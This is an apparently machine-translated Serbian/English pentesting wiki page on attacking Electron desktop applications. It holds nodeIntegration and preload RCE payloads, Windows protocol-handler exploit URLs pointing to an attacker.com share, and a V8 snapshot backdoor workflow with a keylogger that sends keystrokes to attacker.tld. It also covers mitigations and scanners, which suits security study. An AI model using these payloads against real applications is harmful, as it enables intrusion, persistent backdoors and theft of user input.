# Electron Desktop aplikacije

{{#include ../../../banners/hacktricks-training.md}}

## Uvod

Electron kombinuje lokalni backend (sa **NodeJS**) i frontend (**Chromium**), iako mu nedostaju neki sigurnosni mehanizmi modernih pretraživača.

Obično možete naći kod Electron aplikacije unutar `.asar` arhive; da biste dobili kod, potrebno je da je izdvojite:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
U izvornom kodu Electron aplikacije, u datoteci `packet.json`, možete pronaći specificiranu datoteku `main.js` u kojoj su podešene sigurnosne konfiguracije.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ima 2 tipa procesa:

- Main Process (ima potpuni pristup NodeJS-u)
- Renderer Process (trebalo bi da ima ograničen pristup NodeJS-u iz bezbednosnih razloga)

![](<../../../images/image (182).png>)

A **renderer process** biće prozor pregledača koji učitava fajl:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Podešavanja **renderer process** mogu se **konfigurisati** u **main process** u fajlu main.js. Neka od podešavanja mogu **sprečiti Electron application da dobije RCE** ili druge ranjivosti ako su **podešavanja pravilno konfigurisana**.

The electron application **could access the device** via Node apis although it can be configure to prevent it:

- **`nodeIntegration`** - je `off` po defaultu. Ako je uključen, omogućava pristup node funkcijama iz renderer procesa.
- **`contextIsolation`** - je `on` po defaultu. Ako je `off`, main i renderer procesi nisu izolovani.
- **`preload`** - prazan po defaultu.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - je `off` po defaultu. Ograničiće akcije koje NodeJS može izvršavati.
- Node Integration u Workers
- **`nodeIntegrationInSubframes`** - je `off` po defaultu.
- Ako je **`nodeIntegration`** **enabled**, to bi omogućilo korišćenje **Node.js APIs** na web stranicama koje su **učitane u iframes** unutar Electron application.
- Ako je **`nodeIntegration`** **disabled**, tada će preloads biti učitani u iframe

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Neki **RCE payloads** iz [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Presretanje saobraćaja

Izmenite konfiguraciju start-main i dodajte korišćenje proxy-ja, na primer:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Ako možete lokalno izvršiti Electron App, moguće je da biste ga mogli naterati da izvrši proizvoljan javascript kod. Pogledajte kako u:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Ako je **nodeIntegration** podešen na **on**, JavaScript na web stranici može lako da koristi Node.js funkcionalnosti jednostavno pozivanjem `require()`. Na primer, način da se pokrene aplikacija calc na Windows-u je:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skript naveden u ovom podešavanju je **učitan pre drugih skripti u rendereru**, tako da ima **neograničen pristup Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Dakle, skripta može izvoziti node-features na stranice:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Ako je `contextIsolation` uključen, ovo neće raditi**

## RCE: XSS + contextIsolation

_**contextIsolation**_ uvodi **odvojene kontekste između skripti web stranice i unutrašnjeg JavaScript koda Electrona** tako da izvršavanje JavaScript-a jednog koda ne utiče na drugi. Ovo je neophodna funkcija za eliminisanje mogućnosti RCE.

Ako konteksti nisu izolovani, napadač može:

1. Izvršiti **arbitrary JavaScript in renderer** (XSS ili navigaciju ka eksternim sajtovima)
2. **Prepisati ugrađenu metodu** koja se koristi u preload ili unutrašnjem Electron kodu da bi se preuzela kontrola nad funkcijom
3. **Pokrenuti** upotrebu **prepisane funkcije**
4. RCE?

Postoje 2 mesta gde ugrađene metode mogu biti prepisane: u preload kodu ili u unutrašnjem Electron kodu:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Zaobilaženje click event-a

Ako su primenjena ograničenja prilikom klika na link, možda ih možeš zaobići **srednjim klikom** umesto regularnog levog klika
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

For more info about this examples check [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) and [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Prilikom objavljivanja Electron desktop aplikacije, ključno je osigurati ispravna podešavanja za `nodeIntegration` i `contextIsolation`. Uspostavljeno je da **client-side remote code execution (RCE)** usmereno na preload skripte ili native kod Electrona iz glavnog procesa biva efikasno onemogućeno kada su ta podešavanja primenjena.

Kada korisnik interaguje sa linkovima ili otvori nova prozora, pokreću se određeni event listener-i koji su ključni za bezbednost i funkcionalnost aplikacije:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Ovi listeneri su **prepisani od strane desktop aplikacije** kako bi implementirali sopstvenu **poslovnu logiku**. Aplikacija procenjuje da li treba otvoriti navigisani link interno ili u eksternom web browseru. Odluka se obično donosi pomoću funkcije, `openInternally`. Ako ta funkcija vraća `false`, to znači da link treba otvoriti eksterno, koristeći `shell.openExternal` funkciju.

**Evo pojednostavljenog pseudokoda:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Najbolje bezbednosne prakse za Electron JS ne preporučuju prihvatanje nepouzdanog sadržaja preko `openExternal` funkcije, jer to može dovesti do RCE-a kroz različite protokole. Operativni sistemi podržavaju različite protokole koji mogu okinuti RCE. Za detaljne primere i dodatno objašnjenje na ovu temu, pogledajte [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), koji uključuje primere Windows protokola sposobnih da iskoriste ovu ranjivost.

Na macos-u, `openExternal` funkcija se može iskoristiti za izvršavanje proizvoljnih komandi, kao na primer u `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Primeri Windows protokol exploata uključuju:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Ova ranjivost se može naći u **[ovom izveštaju](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

The **webviewTag** je **zastarela funkcija** koja omogućava upotrebu **NodeJS** u **renderer process**, koju treba onemogućiti jer omogućava učitavanje skripte unutar **preload context** kao:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Dakle, napadač koji uspe da učita proizvoljnu stranicu mogao bi да iskoristi taj tag да **učita proizvoljan preload script**.

Taj preload script je zatim био zloupotrebljen да pozove **ranjivu IPC uslugu (`skype-new-window`)** koja је pozivala **`shell.openExternal`** да би ostvarila RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Čitanje internih fajlova: XSS + contextIsolation

**Onemogućavanje `contextIsolation` omogućava upotrebu `<webview>` tagova**, slično `<iframe>`, za čitanje i exfiltrating lokalnih fajlova. Primer u nastavku pokazuje kako iskoristiti ovu ranjivost da se pročita sadržaj internih fajlova:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Dalje, podeljen je još jedan metod za **čitanje internog fajla**, koji ističe kritičnu ranjivost za lokalno čitanje fajlova u Electron desktop aplikaciji. Ovo uključuje injecting a script to exploit the application and exfiltrate data:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Stari Chromium**

Ako je **chromium** koji aplikacija koristi **zastareo** i postoje **poznate** **ranjivosti** u njemu, možda je moguće **iskoristiti ih i dobiti RCE kroz XSS**.\
Možete videti primer u ovom **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Pretpostavimo da ste pronašli XSS ali ne možete da **pokrenete RCE ili ukradete interne fajlove** — možete pokušati da ga iskoristite da **ukradete kredencijale putem phishinga**.

Prvo treba da znate šta se dešava kada pokušate da otvorite novi URL, proveravajući JS kod u front-endu:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Poziv funkcije **`openInternally`** odlučiće da li će **link** biti **opened** u **desktop window** pošto je to link koji pripada platformi, **or** će biti otvoren u **browser as a 3rd party resource**.

U slučaju da je **regex** koji funkcija koristi **vulnerable to bypasses** (na primer **not escaping the dots of subdomains**) napadač može iskoristiti XSS da **open a new window which** će se nalaziti na infrastrukturi napadača i **asking for credentials** od korisnika:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokol

Kao što je pomenuto u [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), stranice koje se pokreću preko **`file://`** imaju jednostran pristup svim fajlovima na vašem računaru, što znači da **XSS ranjivosti mogu biti iskorišćene za učitavanje proizvoljnih fajlova** sa korisnikovog računara. Korišćenje **prilagođenog protokola** sprečava ovakve probleme jer možete ograničiti protokol da servira samo određeni skup fajlova.

## Remote module

The Electron Remote module omogućava **renderer processes to access main process APIs**, olakšavajući komunikaciju unutar Electron aplikacije. Međutim, omogućavanje ovog modula uvodi značajne sigurnosne rizike. Povećava površinu napada aplikacije, čineći je podložnijom ranjivostima kao što su cross-site scripting (XSS) napadi.

> [!TIP]
> Iako **remote** modul izlaže neke API-je iz main u renderer processes, nije jednostavno dobiti RCE samo zloupotrebom komponenti. Međutim, komponente mogu otkriti osetljive informacije.

> [!WARNING]
> Mnoge aplikacije koje još uvek koriste remote module to rade tako da je potrebno omogućiti **NodeIntegration** u renderer process, što je **ogroman sigurnosni rizik**.

Od Electron 14 `remote` module može biti omogućen u nekoliko koraka, ali iz bezbednosnih i performansnih razloga **se preporučuje da se ne koristi**.

Da biste ga omogućili, prvo je potrebno **enable it in the main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Zatim, renderer proces može da uvozi objekte iz modula na sledeći način:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
The **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** ukazuje na neke zanimljive **funkcije** koje izlaže objekat **`app`** iz remote modula:

- **`app.relaunch([options])`**
- **Ponovo pokreće** aplikaciju zatvaranjem trenutne instance i pokretanjem nove. Korisno za **ažuriranja aplikacije** ili značajne **promene stanja**.
- **`app.setAppLogsPath([path])`**
- **Definiše** ili **kreira** direktorijum za čuvanje **logova aplikacije**. Logovi se mogu **dobiti** ili **izmeniti** koristeći **`app.getPath()`** ili **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registruje** trenutni izvršni fajl kao **podrazumevani rukovalac** za određeni **protokol**. Možete navesti **prilagođenu putanju** i **argumente** po potrebi.
- **`app.setUserTasks(tasks)`**
- **Dodaje** zadatke u kategoriju **Tasks** u **Jump List** (na Windows). Svaki zadatak može kontrolisati kako se aplikacija **pokreće** ili koji se **argumenti** prosleđuju.
- **`app.importCertificate(options, callback)`**
- **Uvozi** **PKCS#12 certificate** u sistemsko **skladište sertifikata** (samo Linux). Može se koristiti **callback** za obradu rezultata.
- **`app.moveToApplicationsFolder([options])`**
- **Premešta** aplikaciju u **Applications folder** (na macOS). Pomaže da se obezbedi **standardna instalacija** za korisnike macOS-a.
- **`app.setJumpList(categories)`**
- **Postavlja** ili **uklanja** **prilagođeni Jump List** na **Windows**. Možete navesti **kategorije** da organizujete kako se zadaci pojavljuju korisniku.
- **`app.setLoginItemSettings(settings)`**
- **Konfiguriše** koje **izvršne datoteke** se pokreću pri **prijavi** zajedno sa njihovim **opcijama** (samo macOS i Windows).

Primer:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences modul

**Primarni API** za pristup sistemskim podešavanjima i **emitovanje sistemskih događaja** u Electronu. Metode kao što su **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, i **setUserDefault** su sve **deo** ovog modula.

**Primer upotrebe:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Osluškuje** native macOS notifications koristeći NSDistributedNotificationCenter.
* Pre macOS Catalina, moglo se sniff-ovati **sve** distributed notifications prosleđivanjem **nil** u CFNotificationCenterAddObserver.
* Posle Catalina / Big Sur, sandboxed apps i dalje mogu **subscribe**-ovati na **mnoge događaje** (na primer, **screen locks/unlocks**, **volume mounts**, **network activity**, itd.) registrovanjem notifications **po imenu**.

### **getUserDefault / setUserDefault**

* **Interfejsira** sa NSUserDefaults, koji čuva **application** ili **global** preferences na macOS.

* **getUserDefault** može **dohvatiti** osetljive informacije, kao što su **lokacije nedavno otvorenih fajlova** ili **geografska lokacija korisnika**.

* **setUserDefault** može **izmeniti** ove preference, potencijalno utičući na konfiguraciju aplikacije.

* U **starijim verzijama Electron-a** (pre v8.3.0), samo **standard suite** od NSUserDefaults je bio **pristupačan**.

## Shell.showItemInFolder

Ova funkcija prikazuje zadati fajl u file manageru, koji **može automatski izvršiti fajl**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps treba da imaju **Content Security Policy (CSP)** da bi **sprečili XSS napade**. **CSP** je **security standard** koji pomaže da se **spreči** izvršavanje **nepouzdanog koda** u browser kontekstu.

Obično se **konfiguriše** u **`main.js`** fajlu ili u **`index.html`** šablonu sa CSP unutar **meta taga**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Ovaj real-world lanac je pogodio Visual Studio Code 1.63 (CVE-2021-43908) i pokazuje kako jedna markdown-driven XSS u webview-u može eskalirati do potpunog RCE kada su CSP, postMessage i scheme handlers pogrešno konfigurisani. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Attack chain overview
- First XSS via webview CSP: Generisani CSP je uključivao `style-src 'self' 'unsafe-inline'`, dozvoljavajući inline/style zasnovanu injekciju u `vscode-webview://` kontekstu. Payload je beaconed na `/stealID` da bi exfiltrirao target webview’s extensionId.
- Constructing target webview URL: Korišćenjem leak ID za izgradnju `vscode-webview://<extensionId>/.../<publicUrl>`.
- Second XSS via postMessage trust: Outer webview je verovao `window.postMessage` bez strogih provera origin/type i učitao attacker HTML sa `allowScripts: true`.
- Local file loading via scheme/path rewriting: Payload je prepisao `file:///...` u `vscode-file://vscode-app/...` i zamenio `exploit.md` sa `RCE.html`, zloupotrebljavajući slabu validaciju putanje da učita privilegovani lokalni resurs.
- RCE in Node-enabled context: Učitana HTML stranica se izvršavala sa dostupnim Node API-ima, što je omogućilo izvršavanje OS komandi.

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
Povezano štivo o problemima poverenja postMessage-a:

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **Alati**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) je alat za identifikaciju pogrešnih konfiguracija i sigurnosnih anti-patterna u aplikacijama zasnovanim na Electronu.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) je VS Code dodatak otvorenog koda za Electron aplikacije koji koristi Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) za proveru ranjivih biblioteka trećih strana
- [**Electro.ng**](https://electro.ng/): Potrebno ga je kupiti

## Laboratorije

U [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) možete pronaći laboratoriju za eksploatisanje ranjivih Electron aplikacija.

Neke komande koje će vam pomoći u laboratoriji:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron and Chromium-based apps deserialize a prebuilt V8 heap snapshot at startup (v8_context_snapshot.bin, and optionally browser_v8_context_snapshot.bin) to initialize each V8 isolate (main, preload, renderer). Historically, Electron’s integrity fuses did not treat these snapshots as executable content, so they escaped both fuse-based integrity enforcement and OS code-signing checks. As a result, replacing the snapshot in a user-writable installation provided stealthy, persistent code execution inside the app without modifying the signed binaries or ASAR.

Ključne tačke
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar validate app JavaScript inside the ASAR, but they did not cover V8 heap snapshots (CVE-2025-55305). Chromium similarly does not integrity-check snapshots.
- Attack preconditions: Local file write into the app’s installation directory. This is common on systems where Electron apps or Chromium browsers are installed under user-writable paths (e.g., %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: Reliable execution of attacker JavaScript in any isolate by clobbering a frequently used builtin (a “gadget”), enabling persistence and evasion of code-signing verification.
- Affected surface: Electron apps (even with fuses enabled) and Chromium-based browsers that load snapshots from user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (pokreni različit kod u main vs. renderer)
- Detekcija main procesa: Node-only globals poput process.pid, process.binding(), ili process.dlopen su prisutni u main process isolate.
- Detekcija Browser/renderer: Browser-only globals poput alert dostupni su prilikom izvršavanja u kontekstu dokumenta.

Primer gadgeta koji jednom sondira main-process Node capabilities
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
PoC krađe podataka iz renderer/browser-context (npr. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operaterov radni tok
1) Napišite payload.js koji prepisuje uobičajeni builtin (npr., Array.isArray) i po potrebi pravi grananje po isolate.
2) Napravite snapshot bez Chromium izvora:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Prepišite snapshot fajl(ove) ciljane aplikacije:
- v8_context_snapshot.bin (uvek se koristi)
- browser_v8_context_snapshot.bin (ako se koristi fuse LoadBrowserProcessSpecificV8Snapshot)
4) Pokrenite aplikaciju; gadget se izvršava svaki put kada se upotrebi odabrani builtin.

Napomene i razmatranja
- Zaobilaženje integriteta/potpisa: Snapshot fajlovi se ne tretiraju kao native izvršni fajlovi od strane provera potpisivanja koda i (istorijski) nisu bili pokriveni Electron-ovim fuses ili Chromium kontrolama integriteta.
- Perzistencija: Zamena snapshot-a u instalaciji gde korisnik ima pravo pisanja obično opstaje nakon restartovanja aplikacije i deluje kao potpisana, legitimna aplikacija.
- Chromium browsers: Isti koncept manipulisanja važi i za Chrome/derivate instalirane na lokacijama gde korisnik može pisati. Chrome ima druge mitigacije integriteta, ali eksplicitno isključuje fizički lokalne napade iz svog threat model-a.

Detekcija i mitigacije
- Tretirajte snapshot-e kao izvršni sadržaj i uključite ih u sprovođenje kontrole integriteta (ispravka CVE-2025-55305).
- Preferirajte lokacije instalacije koje su writable samo za admina; uspostavite početne i pratite hash vrednosti za v8_context_snapshot.bin i browser_v8_context_snapshot.bin.
- Detektujte rano-runtime clobbering builtin-a i neočekivane promene snapshot-a; alarmirajte kada deserializovani snapshot-i ne odgovaraju očekivanim vrednostima.

## **Referencije**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
